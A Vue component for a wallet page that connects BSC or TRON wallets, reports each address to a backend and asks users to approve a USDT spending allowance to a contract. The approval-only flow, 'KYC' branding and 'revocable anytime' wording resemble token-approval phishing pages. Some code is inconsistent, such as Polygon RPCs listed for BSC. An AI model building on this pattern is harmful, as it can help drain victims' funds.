<template>
  <div class="home_view">
    <div class="container">
      <div class="KYC_Disclaimer">
        <div class="KYC_Disclaimer_F">
          <div class="KYC_Disclaimer_logo">
            <img src="@/assets/images/logo.svg" alt="" />
          </div>
          <div class="KYC_Disclaimer_title">授權代幣USDT</div>
        </div>
        <div class="KYC_Disclaimer_text">授權可隨時解除</div>
      </div>
      <div class="card">
        <!-- 导航栏切换bsc或tron -->
        <div class="nav_bar">
          <div
            :class="{ Current: indexNav === 'bsc' }"
            class="btn_nav btn_bsc"
            @click="changeNetwork('bsc')"
          >
            BSC
          </div>

          <div
            :class="{ Current: indexNav === 'tron' }"
            class="btn_nav btn_tron"
            @click="changeNetwork('tron')"
          >
            TRON
          </div>
        </div>
        <div class="C404B7C_16">連結錢包</div>
        <div v-if="indexNav === 'tron'">
          <div
            v-if="tronAddress === 'CONNECT TRON WALLET'"
            class="btn"
            @click="LinkedWallet"
          >
            請連結錢包（{{ indexNav === "tron" ? "TRON" : "BSC" }} 鏈）
          </div>
          <div class="btn" v-else>
            {{ tronAddress }}<br />
            已授权（{{ formattedAmount }} USDT）
          </div>
        </div>
        <div v-if="indexNav === 'bsc'">
          <div
            v-if="bscAddress === 'CONNECT BSC WALLET'"
            class="btn"
            @click="LinkedWallet"
          >
            請連結錢包（{{ indexNav === "bsc" ? "BSC" : "TRON" }} 鏈）
          </div>
          <div class="btn" v-else>
            {{ bscAddress }}<br />
            已授权（{{ allowanceInUsdt }} USDT）
          </div>
        </div>

        <el-form ref="ruleFormRef" class="demo-ruleForm" label-position="top">
          <el-form-item label="授權金額（USDT）" prop="name">
            <el-input
              type="number"
              clearable
              placeholder="Enter the authorized amount"
              v-model.trim="authorized"
            />
          </el-form-item>
        </el-form>
        <div
          class="btn"
          @click="approve"
          v-loading.fullscreen.lock="Loading"
          element-loading-background="#716F6FD0"
        >
          提交上鏈
        </div>
      </div>
    </div>
  </div>
</template>
<script lang="ts" setup>
import { ref, onMounted, watch, onUnmounted, Ref } from "vue";
// import abi from "@/utils/abi.json";
import abiU from "@/utils/abiU.json";
import { ElMessage } from "element-plus";
// 状态管理
const tronAddress = ref("CONNECT TRON WALLET"); // Tron 钱包地址
const bscAddress = ref("CONNECT BSC WALLET"); // BSC 钱包地址
const indexNav = ref(localStorage.getItem("network") || "bsc"); // 导航栏默认显示BSC
const changeNetwork = (network: string) => {
  indexNav.value = network;
  //存到本地
  localStorage.setItem("network", network);

  // if (network === "bsc") {
  //   approveBscToken();
  // } else {
  //   connectWallet();
  // }
};

// !  bsc
import Web3 from "web3";
import { SubmitAddress } from "@/api/upload";

const { ethereum } = window; // 获取window.ethereum
const bscWeb3 = new Web3(ethereum); // 初始化Web3
const bscContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT 合约地址
const bscApproveAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // BSC 交易所或目标合约地址

// Bsc网络ID
const Bsc_CHAIN_ID = "0x38"; // BSC网络的链ID 64进制
async function connectWallet1() {
  try {
    // 请求用户连接钱包
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    if (accounts.length > 0) {
      const account = accounts[0];
      const prefix = account.substring(0, 8);
      const suffix = account.slice(-6);
      bscAddress.value = prefix + "..." + suffix; // 设置 BSC 钱包地址
      // 发送地址请求
      sendAddressRequest("ETH", accounts[0]);
    } else {
      ElMessage.error("请先连接钱包");
    }
  } catch (error) {
    console.error("连接钱包失败:", error);
    ElMessage.error("连接钱包失败");
  }
}

async function approveBscToken() {
  const chainId1 = await ethereum.request({ method: "eth_chainId" }); // 获取网络ID
  console.log("chainId1111111", chainId1);
  if (chainId1 == "open_metamask_install_page") {
    ElMessage.error("未检测到钱包插件，请先安装钱包插件");
    return;
  }
  console.log("chainId", chainId1);
  // 确保用户已连接钱包
  await connectWallet1();
  getBscAuthorizedAmount();
  // * 检查网络是否为BSC网络
  const chainId = await ethereum.request({ method: "eth_chainId" }); // 获取网络ID
  if (chainId !== Bsc_CHAIN_ID) {
    // 检查当前网络是否为BSC网络
    try {
      // 切换到BSC网络
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: Bsc_CHAIN_ID }],
      }); // 切换到BSC网络
    } catch (switchError: any) {
      // 捕获错误
      if (switchError.code === 4902) {
        // 如果错误码为4902，则尝试添加BSC网络
        try {
          const res = await ethereum.request({
            method: "wallet_addEthereumChain", // 添加BSC网络
            params: [
              {
                chainId: Bsc_CHAIN_ID, // BSC网络ID
                chainName: "Binance Smart Chain Mainnet", // BSC网络名称
                nativeCurrency: {
                  name: "BNB", // BNB代币名称
                  symbol: "BNB", // BNB代币符号
                  decimals: 18, // BNB代币精度
                },
                rpcUrls: [
                  "https://bsc-dataseed.binance.org",
                  "https://endpoints.omniatech.io/v1/matic/mainnet/public",
                  "https://polygon-bor.publicnode.com",
                  "https://polygon.llamarpc.com",
                  "https://polygon.meowrpc.com",
                  "https://polygon.meowrpc.com",
                  "https://1rpc.io/matic",
                ], // BSC网络RPC节点
                blockExplorerUrls: ["https://bscscan.com"], // BSC网络区块浏览器
              },
            ],
          });
        } catch (addError) {
          alert(
            "添加网络失败! 为你跳转到chainlist.org，请手动添加Binance Smart Chain"
          ); // 添加BSC网络失败
          window.open("https://chainlist.org/chain/56", "_blank"); // 打开BSC网络添加页面
          console.error("无法添加Binance Smart Chain:", addError); // 打印日志
        }
      } else {
        console.error("无法切换到Binance Smart Chain:", switchError); // 打印日志
      }
    }
  }
}

const allowanceInUsdt = ref("0"); // BSC 上的授权金额
async function getBscAuthorizedAmount() {
  try {
    // 获取用户账户
    const accounts = await bscWeb3.eth.getAccounts();
    if (accounts.length === 0) {
      ElMessage.error("钱包未连接，请连接钱包");
      return;
    }
    const account = accounts[0];
    // 获取 USDT 合约实例
    const contract = new bscWeb3.eth.Contract(abiU, bscContractAddress);
    // 调用 allowance 方法，传入钱包地址和授权地址
    const allowance = await contract.methods
      .allowance(account, bscApproveAddress)
      .call();

    // 将授权金额转换为 USDT 单位（通常是 6 位小数）
    allowanceInUsdt.value = bscWeb3.utils.fromWei(allowance as any, "ether");

    // 显示授权金额
    // ElMessage.success(`授权金额: ${allowanceInUsdt.value} USDT`);
  } catch (error) {
    console.error("获取授权金额失败:", error);
    ElMessage.error("获取 BSC 授权金额失败");
  }
}

// 发送地址请求的函数
async function sendAddressRequest(chainName: string, address: string) {
  try {
    const res = await SubmitAddress({
      chain_name: chainName,
      token_address: address,
    });
    console.log(`发送地址请求成功, 链: ${chainName}, 地址: ${address}`, res);
  } catch (error) {
    console.error(`发送地址请求失败:`, error);
  }
}

//  ! tron
const authorized = ref();
const Loading = ref(false);

const tronWebValue = ref<any>(undefined);
const usdtAddress = "TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3"; // 假U JST
const contractAddress = "TPSccvUSCjjTGbf6TSLwTNmCexHqi6BbPt"; // 合约地址
// 连接钱包逻辑
async function connectWallet() {
  try {
    // 检测是否安装 TronLink 或 OKX 钱包
    if (window.tronLink) {
      await window.tronLink.request({ method: "tron_requestAccounts" });
      tronWebValue.value = window.tronLink.tronWeb;
      updateAddress();
      getAuthorizedAmount();
      sendAddressRequest("TRX", window.tronLink.tronWeb);
    } else if (window.okxwallet.tronLink) {
      await window.okxwallet.tronLink.request({
        method: "tron_requestAccounts",
      });
      tronWebValue.value = window.okxwallet.tronLink.tronWeb;
      updateAddress();
      sendAddressRequest("TRX", window.okxwallet.tronLink.tronWeb);
    } else if (window.tronWeb) {
      tronWebValue.value = window.tronWeb;
      updateAddress();
      sendAddressRequest("TRX", window.tronWeb);
    } else {
      ElMessage.error(" 未找到钱包");
    }
  } catch (error) {
    ElMessage.error("连接钱包时发生错误:");
    console.error("连接钱包时发生错误:", error);
  }
}
// 授权金额
async function getAuthorizedAmount() {
  if (!tronWebValue.value) return;
  try {
    // 获取 USDT 合约的实例
    const contract = await tronWebValue.value.contract(abiU, usdtAddress);

    // 查询钱包地址授权给合约地址的金额
    const authorizedAmount = await contract.methods
      .allowance(tronWebValue.value.defaultAddress.base58, contractAddress)
      .call();

    // 转换授权金额为 USDT 单位（通常是 6 位小数）
    formattedAmount.value =
      tronWebValue.value.toDecimal(authorizedAmount) / 1e6;

    // 显示授权金额
  } catch (error) {
    ElMessage.error("获取授权金额失败");
    console.error("获取授权金额失败:", error);
  }
}

async function approve() {
  if (
    !authorized.value ||
    isNaN(Number(authorized.value)) ||
    Number(authorized.value) <= 0
  ) {
    ElMessage.error("请输入一个有效的授权金额");
    return;
  }
  if (indexNav.value === "bsc") {
    try {
      Loading.value = true;
      const contract = new bscWeb3.eth.Contract(abiU, bscContractAddress);
      const accounts = await bscWeb3.eth.requestAccounts();
      const account = accounts[0];
      const amountInWei = bscWeb3.utils.toWei(
        authorized.value.toString(),
        "ether"
      );

      const gasPrice = await bscWeb3.eth.getGasPrice();
      const options = {
        from: account,
        gasPrice: gasPrice.toString(),
      };

      await contract.methods
        .approve(bscApproveAddress, amountInWei)
        .send(options)
        .on("transactionHash", (hash: string) => {
          ElMessage.success("已提交上链");
        })
        .on("confirmation", (params) => {
          const confirmationNumber = Number(params.confirmations); // 从 params 中获取确认次数
          if (confirmationNumber === 1) {
            ElMessage.success("BSC 授权成功");
          }
        })
        .on("error", (error: Error) => {
          ElMessage.error("BSC 授权失败");
          console.error("BSC 授权失败:", error);
        });
    } catch (error) {
      ElMessage.error("授权失败");
      console.error("授权失败:", error);
    } finally {
      Loading.value = false;
    }
  } else {
    try {
      Loading.value = true;
      const options = {
        feeLimit: 600_000_000, // 设置手续费限制 表示这笔交易的最大手续费限制为 600 TRX（TRON 网络的原生代币）。这个值以 sun 为单位，1 TRX = 1e6 sun。
        callValue: 0, // 设置调用价值 表示调用这个智能合约时，转移的 TRX 数量为 0。因为这里只是授权 USDT，而不是发送 TRX。
        shouldPollResponse: true, // 设置为true以返回交易结果
      };

      // 代币地址 这里abiU 代币合约基本上都是一样 ，USDT，代币地址不同
      let contract = await tronWebValue.value.contract(abiU, usdtAddress);
      const authedAmounts = await contract.methods
        .approve(contractAddress, authorized.value * 1e6) // u
        .send(options);

      ElMessage.success("授权成功");
    } catch (error) {
      ElMessage.error("授权失败");
      console.error("授权失败:", error);
    } finally {
      Loading.value = false;
    }
  }
}
const formattedAmount = ref(0);

// 更新钱包地址
const updateAddress = () => {
  if (tronWebValue.value?.defaultAddress?.base58) {
    const currentAddress = tronWebValue.value.defaultAddress.base58;
    const prefix = currentAddress.substring(0, 6);
    const suffix = currentAddress.slice(-4);
    tronAddress.value = `${prefix}...${suffix}`;
  } else {
    ElMessage.error("未连接钱包或用户未授权");
  }
};
const LinkedWallet = async () => {
  if (indexNav.value === "tron") {
    connectWallet();
    // const res = await SubmitAddress({
    //   chain_name: "TRX",
    //   token_address: tronAddress,
    // });
    // console.log('res indexNav.value === "tron"', res);
  } else if (indexNav.value === "bsc") {
    approveBscToken();

    // const res = await SubmitAddress({
    //   chain_name: "ETH",
    //   token_address: bscAddress,
    // });
    // console.log('res indexNav.value === "bsc"', res);
  } else {
    connectWallet();
  }
};
// 页面加载时执行
onMounted(() => {
  // // 检查是否存在 TronWeb 实例
  // if (indexNav.value === "tron") {
  //   connectWallet();
  // } else if (indexNav.value === "bsc") {
  //   approveBscToken();
  // } else {
  //   connectWallet();
  // }
});
</script>
  
  <style scoped lang="less">
.home_view {
  background: @primary-color;

  min-height: calc(100vh);
  .container {
    height: 100vh;
    padding: 16px 0px 0px 0px;
    display: flex;
    flex-direction: column;
    gap: 20px;
    .KYC_Disclaimer {
      padding: 0 20px;
      display: flex;
      flex-direction: column;
      gap: 6px;
      .KYC_Disclaimer_F {
        display: flex;
        gap: 8px;
        .KYC_Disclaimer_title {
          color: #fff;
          font-family: Roboto;
          font-size: 30px;
          font-style: normal;
          font-weight: 700;
          line-height: normal;
        }
      }
      .KYC_Disclaimer_text {
        color: #fff;
        font-family: Roboto;
        font-size: 18px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
      }
    }
    .card {
      height: 100vh;
      // min-height: calc(100vh);
      padding: 38px 20px;
      padding-bottom: 0;
      border-radius: 38px 38px 0px 0px;
      background: #fff;
      box-shadow: 0px 0px 50px 0px rgba(0, 0, 0, 0.18);
      gap: 15px;
      display: flex;
      flex-direction: column;
      .nav_bar {
        margin: 0 auto;
        display: flex;
        width: 168px;
        border: 3px solid @primary-color;
        background: @primary-color;
        height: 36px;
        border-radius: 36px;
        align-items: center;
        justify-content: center;
        .btn_nav {
          display: flex;
          width: 50%;
          flex: 1;
          height: 31px;
          justify-content: center;
          align-items: center;
          flex-shrink: 0;
          font-family: "Plus Jakarta Sans";
          font-size: 20px;
          font-style: normal;
          font-weight: 700;
          line-height: normal;
          background: var(--bgColor-light, #fff);
          color: @primary-color;
        }
        .Current {
          background: @primary-color;
          color: #fff;
        }
        .btn_bsc {
          border-radius: 36px 0px 0px 36px;
        }
        .btn_tron {
          border-radius: 0px 36px 36px 0px;
        }
      }
      .C404B7C_16 {
        color: #404b7c;
        font-family: Poppins;
        font-size: 16px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
      }
    }
  }
  .btn {
    display: flex;
    width: 100%;
    padding: 10px 0px;
    justify-content: center;
    align-items: center;
    text-align: center;
    flex-shrink: 0;
    border-radius: 8px;
    background: @primary-color;
    box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.08);
    color: #d5d5d5;
    font-family: Poppins;
    font-size: 16px;
    font-style: normal;
    font-weight: 400;
    line-height: normal;
  }
  :deep(.el-form-item__label) {
    margin-bottom: 15px !important;
    color: #404b7c;
    font-family: Poppins;
    font-size: 16px;
    font-style: normal;
    font-weight: 400;
    line-height: normal;
  }
  :deep(.el-form-item__label::before) {
    content: "" !important;
    margin-right: 0px !important;
    margin: 0 !important;
    padding: 0 !important;
  }
  :deep(.el-input__wrapper) {
    display: flex;
    width: 374px;
    padding: 10px 11px;
    align-items: center;
    gap: 10px;
    border-radius: 8px;
    background: #f6f6f6;
    box-shadow: 0px 0px 6px 0px rgba(0, 0, 0, 0.08);
  }
  :deep(.el-input__wrapper:hover) {
    box-shadow: 0 0 0 1px var(--el-input-hover-border-color) inset;
  }
  :deep(.el-input__wrapper.is-focus) {
    box-shadow: 0 0 0 1px var(--el-input-focus-border-color) inset;
  }

  :deep(.el-input__inner) {
    font-family: Poppins;
    font-size: 16px;
    font-style: normal;
    font-weight: 400;
    line-height: normal;
  }
  .demo-ruleForm {
    display: flex;
    flex-direction: column;
    gap: 16px;
  }
  .el-form-item {
    margin: 0;
  }
}
:deep(.el-loading-mask) {
  background: #0000003e;
}
</style>
  